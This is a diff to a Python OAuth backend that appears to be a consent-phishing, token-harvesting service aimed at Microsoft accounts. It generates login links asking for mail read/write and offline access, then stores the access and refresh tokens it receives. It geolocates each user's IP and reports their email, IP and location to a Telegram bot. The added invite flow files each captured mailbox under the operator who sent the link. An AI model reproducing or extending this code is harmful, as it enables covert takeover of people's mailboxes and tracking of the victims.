@@ -3,8 +3,9 @@ from datetime import datetime, timedelta
 from urllib.parse import urlencode, quote_plus, unquote
 import requests
 import os
+
 from db import SessionLocal, init_db
-from models import TenantToken
+from models import TenantToken, SavedUser, ConnectInvite
 
 
 # =========================
@@ -14,11 +15,13 @@ CLIENT_ID = "3d3d5a12-09a4-4163-bab2-0188bf65ddd1"
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
 REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+GRAPH_ME_URL = "https://graph.microsoft.com/v1.0/me"
 
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-# keep legacy DB column satisfied
+# legacy DB compatibility for tenant_tokens.session_id NOT NULL
 DEFAULT_SESSION_ID = "jwt-only"
 
 
@@ -31,7 +34,6 @@ def send_telegram_alert(message: str):
         return
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-
     payload = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message
@@ -39,20 +41,17 @@ def send_telegram_alert(message: str):
 
     try:
         res = requests.post(url, data=payload)
-
         if res.status_code != 200:
             print(f"❌ Telegram error: {res.text}")
-
     except Exception as e:
         print(f"❌ Telegram exception: {e}")
 
 
 # =========================
-# TOKEN STORAGE (JWT-ONLY, LEGACY DB SAFE)
+# TOKEN STORAGE
 # =========================
 def save_token(user_id, token_data, device_info=None):
     init_db()
-
     db = SessionLocal()
 
     try:
@@ -96,14 +95,12 @@ def save_token(user_id, token_data, device_info=None):
             db.add(new_row)
 
         db.commit()
-
     finally:
         db.close()
 
 
 def get_token(user_id):
     init_db()
-
     db = SessionLocal()
     try:
         token = db.query(TenantToken).filter_by(
@@ -115,15 +112,95 @@ def get_token(user_id):
 
 
 # =========================
-# LOGIN LINK GENERATION
+# SAVED USER SUPPORT
 # =========================
-def generate_login_link(user_id: str):
-    base_url = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+def save_saved_user(admin_user_id: str, target_user_id: str):
+    init_db()
+    db = SessionLocal()
 
-    state_value = user_id
+    try:
+        existing = (
+            db.query(SavedUser)
+            .filter(
+                SavedUser.admin_user_id == admin_user_id,
+                SavedUser.user_id == target_user_id
+            )
+            .first()
+        )
 
-    print(f"DEBUG: Generated state_value: {state_value}")
+        if not existing:
+            db.add(SavedUser(
+                admin_user_id=admin_user_id,
+                user_id=target_user_id
+            ))
+            db.commit()
+    finally:
+        db.close()
 
+
+# =========================
+# INVITE SUPPORT
+# =========================
+def create_connect_invite(admin_user_id: str):
+    init_db()
+    db = SessionLocal()
+
+    try:
+        invite_token = str(uuid.uuid4())
+
+        invite = ConnectInvite(
+            admin_user_id=admin_user_id,
+            invite_token=invite_token,
+            is_used=False
+        )
+        db.add(invite)
+        db.commit()
+
+        return invite
+    finally:
+        db.close()
+
+
+def get_connect_invite(invite_token: str):
+    init_db()
+    db = SessionLocal()
+
+    try:
+        invite = (
+            db.query(ConnectInvite)
+            .filter(ConnectInvite.invite_token == invite_token)
+            .first()
+        )
+        return invite
+    finally:
+        db.close()
+
+
+def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = None):
+    init_db()
+    db = SessionLocal()
+
+    try:
+        invite = (
+            db.query(ConnectInvite)
+            .filter(ConnectInvite.invite_token == invite_token)
+            .first()
+        )
+
+        if invite:
+            invite.is_used = True
+            invite.used_at = int(datetime.utcnow().timestamp())
+            if resolved_user_id:
+                invite.resolved_user_id = resolved_user_id
+            db.commit()
+    finally:
+        db.close()
+
+
+# =========================
+# HELPERS
+# =========================
+def build_authorize_url(state_value: str):
     params = {
         "client_id": CLIENT_ID,
         "response_type": "code",
@@ -134,39 +211,32 @@ def generate_login_link(user_id: str):
         "prompt": "select_account"
     }
 
-    login_url = f"{base_url}?{urlencode(params)}"
+    login_url = f"{AUTHORIZE_URL}?{urlencode(params)}"
     print(f"DEBUG: Generated login_url: {login_url}")
-
     return login_url
 
 
-# =========================
-# TOKEN EXCHANGE
-# =========================
-def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
-    init_db()
+def fetch_graph_identity(access_token: str):
+    headers = {"Authorization": f"Bearer {access_token}"}
+    res = requests.get(GRAPH_ME_URL, headers=headers)
+    data = res.json() if res.content else {}
 
-    state = unquote(state)
-    user_id = state
+    # prefer UPN, then mail
+    resolved_user_id = (
+        data.get("userPrincipalName")
+        or data.get("mail")
+        or data.get("id")
+    )
 
-    print(f"DEBUG: Extracted user_id: {user_id}")
-
-    data = {
-        "client_id": CLIENT_ID,
-        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
-        "code": code,
-        "redirect_uri": REDIRECT_URI,
-        "grant_type": "authorization_code",
-        "client_secret": CLIENT_SECRET
+    return {
+        "resolved_user_id": resolved_user_id,
+        "profile": data
     }
 
-    response = requests.post(TOKEN_URL, data=data)
-    result = response.json()
 
-    if "error" in result:
-        raise Exception(f"Token exchange failed: {result['error_description']}")
-
+def build_device_info(client_ip: str = None, user_agent: str = None):
     location_str = "unknown"
+
     if client_ip:
         try:
             loc_resp = requests.get(f"https://ipinfo.io/{client_ip}/json")
@@ -176,31 +246,114 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
         except Exception:
             pass
 
-    device_info = {
+    return {
         "ip": client_ip,
         "agent": user_agent,
         "location": location_str
     }
 
-    save_token(user_id, result, device_info)
 
-    headers = {"Authorization": f"Bearer {result['access_token']}"}
-    try:
-        graph_resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
-        email = graph_resp.json().get("userPrincipalName", "unknown")
-    except Exception:
-        email = "unknown"
+# =========================
+# LOGIN LINK GENERATION
+# =========================
+def generate_login_link(user_id: str):
+    # existing per-user flow
+    state_value = f"user:{user_id}"
+    print(f"DEBUG: Generated state_value: {state_value}")
+    return build_authorize_url(state_value)
+
+
+def generate_org_connect_link(admin_user_id: str):
+    # new generic invite flow
+    invite = create_connect_invite(admin_user_id)
+    state_value = f"invite:{invite.invite_token}"
+    print(f"DEBUG: Generated org invite state_value: {state_value}")
+    return build_authorize_url(state_value)
+
+
+# =========================
+# TOKEN EXCHANGE
+# =========================
+def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
+    init_db()
+
+    decoded_state = unquote(state)
+    print(f"DEBUG: Decoded state: {decoded_state}")
+
+    token_payload = {
+        "client_id": CLIENT_ID,
+        "scope": "User.Read Mail.Read Mail.ReadWrite offline_access",
+        "code": code,
+        "redirect_uri": REDIRECT_URI,
+        "grant_type": "authorization_code",
+        "client_secret": CLIENT_SECRET
+    }
+
+    response = requests.post(TOKEN_URL, data=token_payload)
+    result = response.json()
+
+    if "error" in result:
+        raise Exception(f"Token exchange failed: {result['error_description']}")
+
+    access_token = result["access_token"]
+    identity = fetch_graph_identity(access_token)
+    resolved_user_id = identity["resolved_user_id"]
+    profile = identity["profile"]
+
+    if not resolved_user_id:
+      raise Exception("Could not resolve Microsoft user identity from /me")
+
+    device_info = build_device_info(client_ip, user_agent)
+
+    # save token under the REAL Microsoft identity
+    save_token(resolved_user_id, result, device_info)
+
+    # state parsing
+    admin_user_id_for_saved_user = None
+
+    if decoded_state.startswith("user:"):
+        # explicit per-user flow
+        requested_user_id = decoded_state.split("user:", 1)[1]
+        admin_user_id_for_saved_user = requested_user_id
+
+    elif decoded_state.startswith("invite:"):
+        invite_token = decoded_state.split("invite:", 1)[1]
+        invite = get_connect_invite(invite_token)
+
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            mark_connect_invite_used(invite_token, resolved_user_id)
+
+    else:
+        # backward compatibility fallback
+        admin_user_id_for_saved_user = decoded_state
+
+    # auto-save mailbox under the admin who initiated the flow
+    if admin_user_id_for_saved_user:
+        save_saved_user(admin_user_id_for_saved_user, resolved_user_id)
+
+    email = (
+        profile.get("userPrincipalName")
+        or profile.get("mail")
+        or "unknown"
+    )
 
     message = (
-        f"User ID: {user_id}\n"
+        f"Resolved User ID: {resolved_user_id}\n"
+        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
         f"Email: {email}\n"
         f"IP: {client_ip or 'unknown'}\n"
-        f"Location: {location_str}"
+        f"Location: {device_info.get('location', 'unknown')}"
     )
 
     send_telegram_alert(message)
 
-    return result
+    return {
+        "token_result": result,
+        "resolved_user_id": resolved_user_id,
+        "profile": profile,
+        "admin_user_id": admin_user_id_for_saved_user
+    }
 
 
 # =========================
